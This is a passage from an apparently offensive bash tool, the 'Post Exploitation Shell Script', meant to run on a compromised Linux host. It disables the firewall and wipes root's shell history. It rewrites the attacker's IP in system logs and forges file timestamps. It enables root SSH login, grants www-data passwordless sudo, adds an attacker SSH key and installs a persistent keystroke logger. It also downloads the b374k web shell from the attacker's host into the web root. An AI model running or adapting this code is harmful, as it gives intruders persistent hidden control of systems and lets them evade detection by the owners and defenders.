                 echo -e "\t+ [${GREEN}SUCCES${END}] => ufw has been successfully stopped!"
               ;;
               1)
                 echo -e "\t- [${RED}FAILURE${END}] => Failed to stop ufw!"
               ;;
               *)
                 echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred...Could not determine if ufw us running or not!"
               ;;
             esac
           ;;
           1)
             echo -e "\t* [${YELLOW}INFO${END}] => ufw is not running!"
           ;;
           *)
             echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred...Could not determine if ufw us running or not!"
           ;;
         esac
       ;;
       1)
         echo -e "\t* [${YELLOW}INFO${END}] => ufw is not installed!"
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => Failed to determine if ufw is installed!"
       ;;
     esac
   fi
}

# Modify firewall changes
changeFW() {
   echo -e "\t* [${YELLOW}INFO${END}] => Modifying Firewall..."

   "${IPTABLES}" -F
   "${IPTABLES}" -X
   "${IPTABLES}" -t nat -F
   "${IPTABLES}" -t nat -X
   "${IPTABLES}" -t mangle -F
   "${IPTABLES}" -t mangle -X
   "${IPTABLES}" -P INPUT ACCEPT
   "${IPTABLES}" -P FORWARD ACCEPT
   "${IPTABLES}" -P OUTPUT ACCEPT

   if [ "${osType}" == "redhat" ]
   then
     "${SERVICE}" iptables start
     case $? in
       0)
         echo -e "\t+ [${GREEN}SUCCES${END}] => IP tables successfully started and allowing everything!"
       ;;
       1)
         echo -e "\t- [${RED}FAILURE${END}] => IP tables failed to start!"
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
       ;;
     esac
   elif [ "${osType}" == "debian" ]
   then
     md5Val=$("${IPTABLES}" -L | "${MD5SUM}" - | "${AWK}" '{ print $1 }')
 
     if [ "${md5Val}" == "f2384cfbed4d4fb64061368c4128d7ea" ]
     then
       echo -e "\t+ [${GREEN}SUCCES${END}] => IP tables successfully started and allowing everything!"
     else
       echo -e "\t- [${RED}FAILURE${END}] => IP tables not correct. Manual investigation required!"
     fi
   else
     echo -e "\t- [${RED}FAILURE${END}] => Could not detect Operating System!"
   fi
}

# Add this script to .bashrc
checkBash() {
   # .bashrc
   "${GREP}" -q "/etc/cron.daily/daily_backup.sh -i" /root/.bashrc
   if [ $? == 0 ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => Script already added to .bashrc"
   elif [ $? == 1 ]
   then
     echo -e "/etc/cron.daily/daily_backup.sh -i ${attackIP}" >> /root/.bashrc
     echo -e "\t+ [${GREEN}SUCCESS${END}] => Script successfully added to .bashrc"
   else
     echo -e "\t- [${RED}FAILURE${END}] => Script failed to be added to .bashrc"
   fi
}

# Clean up history on the target
clearHist() {
   unset HISTFILE HISTFILESIZE HISTSIZE

   echo -e "\t* [${YELLOW}INFO${END}] => Clearing history..."
 
   timestamp1=$(getTime "/root/.history")

   fileSize=$("${STAT}" -c%s "/root/.history")
   if [ "${fileSize2}" == "0" ]
   then
     echo -e "\t+ [${YELLOW}INFO${END}] => /root/.history contains no content, not backing up!"
   else
     # Back up .history before clearing
     cp /root/.history "/tmp/.root/.home/.user/.history.backup.$(date +%d-%m-%Y.%H.%M.%S)"
     case $? in
       0)
         echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully backed up ~/.history!"
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => Failed to backup ~/.history!"
       ;;
     esac
   
     > "/root/.history"

     fileSize1=$("${STAT}" -c%s "/root/.history")
     if [[ "${fileSize1}" == "0" ]]
     then
       echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully cleared /root/.history"
     elif [[ "${fileSize1}" == "1" ]]
     then
       echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully cleared /root/.history"
     else
       echo -e "\t- [${RED}FAILURE${END}] => Failed to clear /root/.history"
     fi
   fi

   setTime "${timestamp1}" "/root/.history"
   verifyTime "/root/.history" "${timestamp1}"

   timestamp2=$(getTime "/root/.bash_history")

   fileSize2=$("${STAT}" -c%s "/root/.bash_history")
   if [[ "${fileSize2}" == "0" ]]
   then
     echo -e "\t+ [${YELLOW}INFO${END}] => /root/.bash_history contains no content, not backing up!"
   else
     # Back up .bash_history before clearing
     cp /root/.bash_history "/tmp/.root/.home/.user/.bash_history.backup.$(date +%d-%m-%Y.%H.%M.%S)"
     case $? in
       0)
         echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully backed up /root/.bash_history!"
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => Failed to backup /root/.bash_history!"
       ;;
     esac

     > "/root/.bash_history"

     fileSize3=$("${STAT}" -c%s "/root/.bash_history")
     if [[ "${fileSize3}" == "0" ]]
     then
       echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully cleared /root/.bash_history"
     elif [[ "${fileSize2}" == "1" ]]
     then
       echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully cleared /root/.bash_history"
     else
       echo -e "\t- [${RED}FAILURE${END}] => Failed to clear /root/.bash_history"
     fi
   fi

   setTime "${timestamp2}" "/root/.bash_history"
   verifyTime "/root/.bash_history" "${timestamp2}"
}

# Check logs for the attacker IP and
# Replace it with 127.0.0.1
fixLogs() {
   echo -e "\t* [${YELLOW}INFO${END}] => Target IP: ${targetIP}"

   "${GREP}" -Elrq "${attackIP}" /var/log/
   if [ $? == 0 ]
   then
     "${GREP}" -Elr "${attackIP}" "/var/log/" | while IFS= read -r files
     do
       echo -e "\t* [${YELLOW}INFO${END}] => Modifying log ${files}..."
     
       timestamp=$(getTime "${files}")

       "${SED}" -i "s/${attackIP}/127\.0\.0\.1/g" "${files}"
  
       setTime "${timestamp}" "${files}"
       verifyTime "${files}" "${timestamp}"
     done
   elif [ $? == 1 ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => Logs have already been modified"
   else
     echo -e "\t- [${RED}FAILURE${END}] => An error has occurred"
   fi
}

# verify SSH is installed and
# That SSH allows Root Login
checkSSH() {
   pkgSSH="openssh-server"
   serviceSSH=""
   if [ "${osType}" == "redhat" ]
   then
      serviceSSH="sshd"

      # Checking if SSH Server is installed
      "${RPM}" -qa | "${GREP}" "${pkgSSH}" > /dev/null
      case $? in
         0)
             echo -e "\t* [${YELLOW}INFO${END}] => SSH Server is installed!"
         ;;
         1)
             echo -e "\t- [${RED}FAILURE${END}] => SSH Server not installed!"
         ;;
         *)
             echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occured. We could not determine whether SSH server is installed or not!"
         ;;
      esac

      # Checking if SSH Service is running
      "${PGREP}" "${serviceSSH}" > /dev/null
      case $? in
         0)
             echo -e "\t* [${YELLOW}INFO${END}] => SSH Service is running!"
         ;;
         1)
             echo -e "\t- [${RED}FAILURE${END}] => SSH service is not running!"
             "${SERVICE}" "${serviceSSH}" start > /dev/null
             if [ $? == 0 ]
             then
                 echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully started ${serviceSSH}!"
             else
                 echo -e "\t- [${RED}FAILURE${END}] => Failed to start ${serviceSSH}!"
             fi 
         ;;
         *)
             echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred. Could not determine if the SSH service is running or not!"
         ;;
      esac
   elif [ "${osType}" == "debian" ]
   then
      serviceSSH="ssh"
      # Checking if SSH Server is installed
      "${DPKG}" -s "${pkgSSH}" > /dev/null
      case $? in
         0)
             echo -e "\t* [${YELLOW}INFO${END}] => SSH Server is installed!"
         ;;
         1)
             echo -e "\t- [${RED}FAILURE${END}] => SSH Server not installed!"
         ;;
         *)
             echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occured. We could not determine whether SSH server is installed or not!"
         ;;
      esac

      # Checking if SSH Service is running
      "${PGREP}" "${serviceSSH}" > /dev/null
      case $? in
         0)
             echo -e "\t* [${YELLOW}INFO${END}] => SSH Service is running!"
         ;;
         1)
             echo -e "\t- [${RED}FAILURE${END}] => SSH service is not running!"
             "${SERVICE}" "${serviceSSH}" start > /dev/null
             if [ $? == 0 ]
             then
                 echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully started ${serviceSSH}!"
             else
                 echo -e "\t- [${RED}FAILURE${END}] => Failed to start ${serviceSSH}!"
             fi 
         ;;
         *)
             echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred. Could not determine if the SSH service is running or not!"
         ;;
      esac
   else
      echo -e "\t- [${RED}FAILURE${END}] => Failed to determine the target's Operating System!"
    fi
    
   timestamp=$(getTime "/etc/ssh/sshd_config")
 
   "${GREP}" -q "PermitRootLogin no" "/etc/ssh/sshd_config"
   if [ $? == 0 ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => Modifing sshd_config for root login"
     "${SED}" -i "s/PermitRootLogin no/PermitRootLogin yes/g" "/etc/ssh/sshd_config"
  
     "${GREP}" -q "PermitRootLogin yes" "/etc/ssh/sshd_config"
     case $? in
        0)
           echo -e "\t+ [${GREEN}SUCCESS${END}] => SSH is now allowing root login!"
           echo -e "\t* [${YELLOW}INFO${END}] => Restarting SSH daemon..."
     
           if [ "${osType}" == "redhat" ]
           then
              "${SERVICE}" sshd restart
           elif [ "${osType}" == "debian" ]
           then
              /etc/init.d/sshd restart
           else
              echo -e "\t- [${RED}FAILURE${END}] => Could not detect Operating System!"
           fi
        ;;
        1)
           echo -e "\t- [${RED}FAILURE${END}] => Failed to modify sshd_config!"
        ;;
        *)
           echo  -e "\t- [${RED}FAILURE${END}] => An unknown error has occurred! Could not modify /etc/ssh/sshd_config!"
        ;;
     esac
   elif [ $? == 1 ]
   then
      echo -e "\t* [${YELLOW}INFO${END}] => sshd_config already modified - \"PermitRootLogin no\" not found"
   else
      echo  -e "\t- [${RED}FAILURE${END}] => An unknown error has occurred!"
   fi
 
   setTime "${timestamp}" "/etc/ssh/sshd_config"
   verifyTime "/etc/ssh/sshd_config" "${timestamp}"
}

# Check /etc/passwd for /sbin/nologin
# And modify the shell to /bin/bash
checkNoLogin() {
   timestamp=$(getTime "/etc/passwd")
 
   echo -e "\t* [${YELLOW}INFO${END}] => Checking /etc/passwd for nologin..."

   "${GREP}" -q "/sbin/nologin" /etc/passwd
   if [ $? == 0 ]
   then
     "${SED}" -i "s/\/sbin\/nologin/\/bin\/bash/g" /etc/passwd

     "${GREP}" -q "/sbin/nologin" /etc/passwd
     case $? in
       0)
          echo -e "\t- [${RED}FAILURE${END}] => Failed to modify nologin's in /etc/passwd!"
       ;;
       1)
          echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully modified nologin's in /etc/passwd!"
       ;;
       *)
          echo -e "\t- [${RED}FAILURE${END}] => An unknown error has occurred!"
       ;;
     esac
   elif [ $? == 1 ]
   then
      echo -e "\t* [${YELLOW}INFO${END}] => /etc/passwd contains no /sbin/login's!"
   else
      echo -e "\t- [${RED}FAILURE${END}] => An unknown error has occurred!"
   fi

   setTime "${timestamp}" "/etc/passwd"
   verifyTime "/etc/passwd" "${timestamp}"
}

# Downloads the b374k web shell to
# The target, so that we can have another avenue
# Of attack. Also, add www-data to /etc/sudoers
getWebShell() {
   docRoot=""

   #attackIP=$(deobf "${attackIP}")
   attackIP="${attackIP}"

   # Uncomment if you are in an online environment
   #shellURL="https://github.com/b374k/b374k/archive/master.zip"
   # Comment out if you are in an online environment - For use in offline environments
   shellURL="http://${attackIP}/b374k/master.zip"
   targetIP=$(ifconfig | "${GREP}" inet | "${GREP}" -v inet6 | "${GREP}" -v 127| "${AWK}" -F":" '{ print $2 }' | "${AWK}" '{ print $1 }')
 
   "${GREP}" -q "www-data" /etc/sudoers
   case $? in
     0)
       echo -e "\t* [${YELLOW}INFO${END}] => www-data already added to /etc/sudoers!"
     ;;
     1)
       echo -e "\t- [${RED}FAILURE${END}] => www-data is not in /etc/sudoers!"
       echo ""
       echo -e "\t* [${YELLOW}INFO${END}] => Attempting to add www-data to /etc/sudoers..."
       echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers
    
       "${GREP}" -q "www-data" /etc/sudoers
       case $? in
         0)
           echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully added www-data to /etc/sudoers!"
         ;;
         1)
           echo -e "\t- [${RED}FAILURE${END}] => Failed to add www-data to /etc/sudoers!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => Cannot determine if www-data was added to /etc/sudoers!"
         ;;
       esac
     ;;
     *)
       echo -e "\t- [${RED}FAILURE${END}] => Cannot determine if www-data is in /etc/sudoers!"
     ;;
   esac
   if [ "${osType}" == "redhat" ]
   then
      if [ -f  /etc/httpd/conf/httpd.conf ]
      then
         docRoot=$("${GREP}" ^DocumentRoot -ri /etc/httpd/conf/httpd.conf | "${AWK}" '{ print $2 }' | ${SED} -e 's/\"//g')
         echo -e "\t* [${YELLOW}INFO${END}] => Apache root is ${docRoot}!"
      fi

      "${RPM}" -qa | "${GREP}" httpd > /dev/null
      case $? in
         0)
            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is installed. Checking to see if it is running..."
            "${PGREP}" httpd > /dev/null
            if [ $? == 0 ]
            then
               echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is running!"
               if [ ! -f "${docRoot}/image/index.php" ]
               then
                 echo -e "\t* [${YELLOW}INFO${END}] => Downloading shell..."
                 "${WGET}" -P "${docRoot}" "${shellURL}" -o /dev/null
                 cd "${docRoot}" || exit 1
 
                 which unzip > /dev/null
                 case $? in
                   0)
                     echo -e "\t* [${YELLOW}INFO${END}] => unzip utility is already installed!"
                   ;;
                   1)
                     echo -e "\t* [${YELLOW}INFO${END}] => unzip is not installed, Attempting to install..."
                     "${YUM}" install -y -q unzip
                   ;;
                   *)
                     echo -e "\t- [${RED}FAILURE${END}] => Could not determine if unzip is installed or not!"
                   ;;
                 esac

                 "${MV}" master master.zip
                 $("${WHICH}" unzip) master.zip > /dev/null
                 "${RM}" -rf master.zip
                 "${MV}" b374k-master/ image/

                 echo -e "\t+ [${GREEN}SUCCESS${END}] => Shell installed. Access URL: http://${targetIP}/image/index.php"
               else
                 echo -e "\t* [${YELLOW}INFO${END}] => Shell already installed!"
               fi
            elif [ $? == 1 ]
            then
              echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is not running...Attempting to start..."
               "${SERVICE}" httpd start

               "${PGREP}" httpd > /dev/null            
               if [ $? == 0 ]
               then
                 echo -e "\t+ [${GREEN}SUCCESS${END}] => Apache Started."

                 if [ ! -f "${docRoot}/image/index.php" ]
                 then
                   echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is running...Downloading shell..."

                   "${WGET}" -P "${docRoot}" "${shellURL}" -o /dev/null
                   cd "${docRoot}" || exit 1
                   "${MV}" master master.zip
                   $("${WHICH}" unzip) master.zip > /dev/null
                   "${RM}" -rf master.zip
                   "${MV}" b374k-master/ image/

                   echo -e "\t+ [${GREEN}SUCCESS${END}] => Shell installed. Access URL: http://${targetIP}/image/index.php"
                 else
                   echo -e "\t* [${YELLOW}INFO${END}] => Shell already installed!"
                 fi
               elif [ $? == 1 ]
               then
                 echo -e "\t- [${RED}FAILURE${END}] => Failed to start Apache!"
               else
                 echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
               fi
            else
               echo -e "\t* [${YELLOW}INFO${END}] => Could not determine if Apache \(httpd\) is running!"
            fi
         ;;
         1)
            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is not installed!"
         ;;
         *)
            echo -e "\t- [${RED}FAILURE${END}] => Could not determine if  Apache \(httpd\) is installed!"
         ;;
      esac

      "${RPM}" -qa | "${GREP}" php > /dev/null
      case $? in
        0)
          echo -e "\t* [${YELLOW}INFO${END}] => php5 is already installed on the target!"
        ;;
        1)
          echo -e "\t* [${YELLOW}INFO${END}] => php5 is not installed...Attempting to install!"
          "${YUM}" install -y -q php php-mysql

          "${RPM}" -qa | "${GREP}" php > /dev/null
          case $? in
            0)
              echo -e "\t+ [${GREEN}SUCCESS${END}] => php5 is installed on the target!"
            ;;
            1)
              echo -e "\t- [${RED}FAILURE${END}] => Failed to install php5 on the target!"
            ;;
            *)
              echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred...Could not determine if php5 is installed or not!"
            ;;
          esac
        ;;
        *)
          echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred...Could not determine if php5 is installed or not!"
        ;;
      esac
   elif [ "${osType}" == "debian" ]
   then
      if [ -f  /etc/apache2/sites-available/000-default.conf ]
      then
         docRoot=$("${GREP}" DocumentRoot -ri /etc/apache2/sites-available/000-default.conf | "${AWK}" '{ print $2 }')
         echo -e "\t* [${YELLOW}INFO${END}] => Apache root is ${docRoot}!"
      elif [ -f /etc/apache2/sites-available/default ]
      then
         docRoot=$("${GREP}" DocumentRoot -ri /etc/apache2/sites-available/default | "${AWK}" '{ print $2 }')
         echo -e "\t* [${YELLOW}INFO${END}] => Apache root is ${docRoot}!"
      else
         echo -e "\t- [${RED}FAILURE${END}] => Could not determine the apache configuration file with 'DocumentRoot'!"
      fi

      "${DPKG}" -l | "${GREP}" apache2 > /dev/null
      case $? in
         0)
            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is installed. Checking to see if it is running..."

            "${PGREP}" apache2 > /dev/null
            if [ $? == 0 ]
            then
               echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is running!"

               if [ ! -f "${docRoot}/image/index.php" ]
               then
                 echo -e "\t* [${YELLOW}INFO${END}] => Checking if shell archive exists..."
       
                 if [ ! -f "${docRoot}/master.zip" ]
                 then
                   echo -e "\t* [${YELLOW}INFO${END}] => Downloading shell..."
                   "${WGET}" -P "${docRoot}" "${shellURL}" -o /dev/null
                 fi

                 which unzip > /dev/null
                 case $? in
                   0)
                     echo -e "\t* [${YELLOW}INFO${END}] => unzip utility is already installed!"
                   ;;
                   1)
                     echo -e "\t* [${YELLOW}INFO${END}] => unzip is not installed, Attempting to install..."
                     "${APTGET}" -y -qq install unzip
                   ;;
                   *)
                     echo -e "\t- [${RED}FAILURE${END}] => Could not determine if unzip is installed or not!"
                   ;;
                 esac

                 cd "${docRoot}" || exit 1
                 $("${WHICH}" unzip) "master.zip" > /dev/null
                 "${RM}" -rf master.zip
                 "${MV}" b374k-master/ image/

                 echo -e "\t+ [${GREEN}SUCCESS${END}] => Shell installed. Access URL: http://${targetIP}/image/index.php"
               else
                 echo -e "\t* [${YELLOW}INFO${END}] => Shell already installed!"
               fi
            elif [ $? == 1 ]
            then
               echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is not running...Attempting to start..."
               "${SERVICE}" apache2 start

               "${PGREP}" apache2 > /dev/null
               if [ $? == 0 ]
               then
                 echo -e "\t+ [${GREEN}SUCCESS${END}] => Apache Started."
                 if [ ! -f "${docRoot}/image/index.php" ]
                 then
                   echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is running...Downloading shell..."

                   "${WGET}" -P "${docRoot}" "${shellURL}" -o /dev/null
                   cd "${docRoot}" || exit 1
                   $("${WHICH}" unzip) master.zip > /dev/null
                   "${RM}" -rf master.zip
                   "${MV}" b374k-master/ image/

                   echo -e "\t+ [${GREEN}SUCCESS${END}] => Shell installed. Access URL: http://${targetIP}/image/index.php"
                 else
                   echo -e "\t* [${YELLOW}INFO${END}] => Shell already installed!"
                 fi
               elif [ $? == 1 ]
               then
                 echo -e "\t- [${RED}FAILURE${END}] => Failed to start Apache!"
               else
                 echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
               fi
            else
               echo -e "\t* [${YELLOW}INFO${END}] => Could not determine if Apache \(apache2\) is running!"
            fi
         ;;
         1)
            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is not installed!"
         ;;
         *)
            echo -e "\t- [${RED}FAILURE${END}] => Could not determine if  Apache \(apache2\) is installed!"
         ;;
      esac

      "${DPKG}" -l | "${GREP}" php5 > /dev/null
      case $? in
        0)
          echo -e "\t* [${YELLOW}INFO${END}] => php5 is already installed on the target!"
        ;;
        1)
          echo -e "\t* [${YELLOW}INFO${END}] => php5 is not installed...Attempting to install!"
          "${APTGET}" -y -qq install php5 php5-common php5-mysql

          "${DPKG}" -l | "${GREP}" php5 > /dev/null
          case $? in
            0)
              echo -e "\t+ [${GREEN}SUCCESS${END}] => php5 is installed on the target!"
            ;;
            1)
              echo -e "\t- [${RED}FAILURE${END}] => Failed to install php5 on the target!"
            ;;
            *)
              echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred...Could not determine if php5 is installed or not!"
            ;;
          esac
        ;;
        *)
          echo -e "\t- [${RED}FAILURE${END}] => An unexpected error occurred...Could not determine if php5 is installed or not!"
        ;;
      esac
   else
      echo -e "\t- [${RED}FAILURE${END}] => Could not determine Operating System!"
   fi
}

# Create sshd script to monitor
# Keystrokes. Creates watchdogger that
# Monitors the sshd logs for size. If they become
# Large, watchdogger archives them.
writeSSH() {
   # sshd keylogger script
   if [ ! -f /tmp/.root/.home/.user/.logger.log ]
   then
      echo -e "\t* [${YELLOW}INFO${END}] => logger.log does not exist...Attempting to create it!"
      "${TOUCH}" /tmp/.root/.home/.user/.logger.log
   fi

   if [ -f /etc/profile.d/sshd ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => sshd shell file exists!"
   elif [ ! -f /etc/profile.d/sshd ]
   then
     "${TOUCH}" /etc/profile.d/sshd
     "${CHMOD}" 755 /etc/profile.d/sshd

     { echo "#!/bin/bash"
       echo ""
       echo "script -a /tmp/.root/.home/.user/.logger.log -q"
     } > /etc/profile.d/sshd
   else
     echo -e "\t- [${RED}FAILURE${END}] => Failed to create sshd in /etc/profile.d/!"
   fi

   # File size monitor for sshd
   if [ -f /etc/cron.hourly/watchdogger ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => watchdogger monitoring file exists!"
   elif [ ! -f /etc/cron.hourly/watchdogger ]
   then
     { echo "#!/bin/bash"
       echo ""
       echo "# Monitor Logger File Size"
       echo -e "fileSize=\$(( \$(${STAT} -c%s \"/tmp/.root/.home/.user/.logger.log\") / 1024 ))"
    
       echo "if [ \${fileSize} -ge 20971520 ]"
       echo "then"
       echo "  { echo \"[+] Archiving Logger Logs\""
       echo -e "    echo -e \"\t* [${YELLOW}INFO${END}] => \$(date +%d-%m-%Y\" \"%H.%M.%S)\""
       echo "  } >> /tmp/.root/.home/.user/.watchdogger.log"
       echo ""
       echo "  # Archive logger file"
       echo "  ${TAR} czf /tmp/.root/.home/.user/.logger.log.1.tgz /tmp/.root/.home/.user/.logger.log"
       echo ""
       echo "  if [ -f /tmp/.root/.home/.user/.logger.log.1.tgz ]"
       echo "  then"
       echo -e "     echo -e \"\t+ [${GREEN}SUCCESS${END}] => Successfully archived logger output!\" >> /tmp/.root/.home/.user/.watchdogger.log"
       echo "  else"
       echo -e "     echo -e \"\t- [${RED}FAILURE${END}] => Failed to archive logger output!\" >> /tmp/.root/.home/.user/.watchdogger.log"
       echo "  fi"
       echo "  echo \"\" >> /tmp/.root/.home/.user/.watchdogger.log"
       echo "fi"
     } > /etc/cron.hourly/watchdogger

     "${CHMOD}" 755 /etc/cron.hourly/watchdogger
     if [ "${osType}" == "redhat" ]
     then
       cronFile="/var/spool/cron/root"
     elif [ "${osType}" == "debian" ]
     then
       cronFile="/var/spool/cron/crontabs/root"
     else
       echo -e "\t* [${RED}FAILURE${END}] => Could not determine Operating System to set root's cron file!"
     fi

     # Check if cron job exists
     "${GREP}" -q 'watchdogger' "${cronFile}"
     if [ $? == 0 ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => watchdogger cron job exists!"
     elif [ $? == 1 ]
     then
       "${CRONTAB}" -l | { cat; echo "3 * * * * /etc/cron.hourly/watchdogger >> /tmp/.root/.home/.user/.watchdogger.log"; } | "${CRONTAB}" -
       case $? in
         0)
           echo -e "\t+ [${GREEN}SUCCES${END}] => watchdogger cron job successfully created!"
         ;;
         1)
           echo -e "\t- [${RED}FAILURE${END}] => watchdogger cron job failed to be created!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
         ;;
       esac
     else
       echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
     fi
   else
     echo -e "\t- [${RED}FAILURE${END}] => Failed to create watcdogger in /etc/cron.hourly/!"
   fi
}

# Obfuscation function used for
# Obfuscating data for use with this script
obf() {
   obfString=$(tr ".0-9a-zA-Z\/\/\:" "a-zA-Z0-9\;-=+*\/" <<< "${1}" | "${BASE64}" -)
   echo "${obfString}"
}

# Debfuscation function used for
# deobfuscating data for use with this script
deobf() {
   obfString=$(echo "${1}" | "${BASE64}" -d | tr "a-zA-Z0-9\;-=+*\/" ".0-9a-zA-Z\/\/\:")
   echo "${obfString}"
}

# Help function
help() {
   echo "Usage: ${0} [-h] [-k your_public_ssh_key] [-d String] [-o String] [-i attacker_ip]"
   echo ""
   echo "Post Exploitation Shell Script (PESS)"
   echo ""
   echo "Script Option Usage Guide:"
   echo ""
   echo " -h"
   echo -e "\thelp, prints this help menu"
   echo ""
   echo " -o"
   echo -e "\tobfuscate, obfuscates supplied input, used with the -i option"
   echo -e "\t* Useful for obfuscating attacker IP"
   echo ""
   echo " -d"
   echo -e "\tdeobfuscate, deobfuscates supplied input"
   echo -e "\t* Used for deobfuscating data obfuscated with the -o option"
   echo ""
   echo " -k"
   echo -e "\tkey, user supplies the contents of their id_rsa.pub"
   echo -e "\t* The key is added to /root/.ssh/authorized_keys to allow passwordless SSH"
   echo ""
   echo " -i"
   echo -e "\tIP, user supplies his/her obfuscated IP"
   echo -e "\t* This option is required to run this script"
   echo ""
   echo ""
   echo "Script Function Usage Guide:"
   echo ""
   echo "  getTime():"
   echo -e "\tUsage:     getTime \"/path/to/file\""
   echo -e "\tExample:   getTime \"/etc/sudoers\""
   echo ""
   echo "  setTime():"
   echo -e "\tUsage:     setTime \"timestamp\" \"/path/to/file\""
   echo -e "\tExample:   setTime \"\$(getTime /etc/sudoers)\" \"/etc/sudoers\""
   echo ""
   echo "  statusCheck():"
   echo -e "\tUsage:     statusCheck \"Success Message\" \"Failure Message\" \"File\""
   echo -e "\tExample:   statusCheck \"\user successfully added to /etc/sudoers\" \"Failed to user to file\" \"/etc/sudoers\""
   echo ""
   echo "  verifyTime():"
   echo -e "\tUsage:     verifyTime \"File\" \"timestamp\""
   echo -e "\tExample:   verifyTime \"/etc/sudoers\" \"1456378129\""
   echo ""
}

while [ $# -gt 0 ]
do
   if [ "${1}" == "-h" ]
   then
     help
     exit 0
   fi

   if [ "${1}" == "-o" ]
   then
     shift
     if [ "${1}" == "" ]
     then
       echo -e "\t- [${RED}FAILURE${END}] => No input supplied, -o requires a parameter!"
       exit 1
     elif [ "${1}" != "" ]
     then
       obfuscate=$(obf "${1}")
       echo -e "\t+ [${GREEN}SUCCESS${END}] => Your data has been successfully obfuscated!"
       echo -e "\t* [${YELLOW}INFO${END}] => Obfuscated text: ${obfuscate}"
       exit 0
     else
       echo -e "\t- [${RED}FAILURE${END}] => Failed to obfuscate your data!"
       exit 1
     fi
     exit 0
   fi

   if [ "${1}" == "-d" ]
   then
     shift
     if [ "${1}" == "" ]
     then
       echo -e "\t- [${RED}FAILURE${END}] => No input supplied, -o requires a parameter!"
       exit 1
     elif [ "${1}" != "" ]
     then
       deObfuscate=$(deobf "${1}")
       echo -e "\t+ [${GREEN}SUCCESS${END} => Your data has been successfully obfuscated!"
       echo -e "\t* [${YELLOW}INFO${END} => Obfuscated text: ${deObfuscate}"
       exit 0
     else
       echo -e "\t- [${RED}FAILURE${END}] => Failed to deobfuscate your data!"
       exit 1
     fi
     exit 0
   fi

   if [ "${1}" == "-k" ]
   then
      echo "[+] Detecting User SSH Key..." >> "${LOG}"
      shift
      if [ "${1}" == "" ]
      then
         echo -e "\t- [${RED}FAILURE${END}] => No SSH key supplied, -k requires a parameter!" >> "${LOG}"
         exit 1
      elif [ "${1}" != "" ]
      then
         sshKey="${1}"
         echo ""
         echo "[+] Adding User SSH Key to Target..." >> "${LOG}"
         if [ -d /root/.ssh/ ]
         then
            if [ -f /root/.ssh/authorized_keys ]
            then
               timestamp=$(getTime /root/.ssh/authorized_keys)

               "${GREP}" -q "${sshKey}" /root/.ssh/authorized_keys
               if [ $? == 0 ]
               then
                 echo -e "\t* [${YELLOW}INFO${END} => SSH Key exists in /root/.ssh/authorized_keys!" >> "${LOG}"
               else
                 echo "${sshKey}" >> /root/.ssh/authorized_keys
               fi

               keyPerms=$("${STAT}" -c %a /root/.ssh/authorized_keys)
               if [ "${keyPerms}" == "640" ]
               then
                 echo -e "\t* [${YELLOW}INFO${END} => SSH Key already have the proper permissions set!" >> "${LOG}"
               else
                 # Set proper permissions on authorized_keys
                 "${CHMOD}" 640  /root/.ssh/authorized_keys

                 setTime "${timestamp}" /root/.ssh/authorized_keys
                 verifyTime /root/.ssh/authorized_keys "${timestamp}"
               fi

               "${GREP}" -q "${sshKey}" /root/.ssh/authorized_keys
               case $? in
                  0)
                     echo -e "\t+ [${GREEN}SUCCESS${END}] => User supplied SSH key successfully added to target!." >> "${LOG}"
                  ;;
                  *)
                     echo -e "\t- [${RED}FAILURE${END}] => An unknown error occured. Failed to add user supplied SSH key to target!." >> "${LOG}"
                     exit 1
                  ;;
               esac
            elif [ ! -f /root/.ssh/authorized_keys ]
            then
               "${TOUCH}" /root/.ssh/authorized_keys
               timestamp=$(getTime /etc/passwd)

               "${GREP}" -q "${sshKey}" /root/.ssh/authorized_keys
               if [ $? == 0 ]
               then
                 echo -e "\t* [${YELLOW}INFO${END} => SSH Key exists in /root/.ssh/authorized_keys!" >> "${LOG}"
               else
                 echo "${sshKey}" >> /root/.ssh/authorized_keys
               fi

               keyPerms=$("${STAT}" -c %a /root/.ssh/authorized_keys)
               if [ "${keyPerms}" == "640" ]
               then
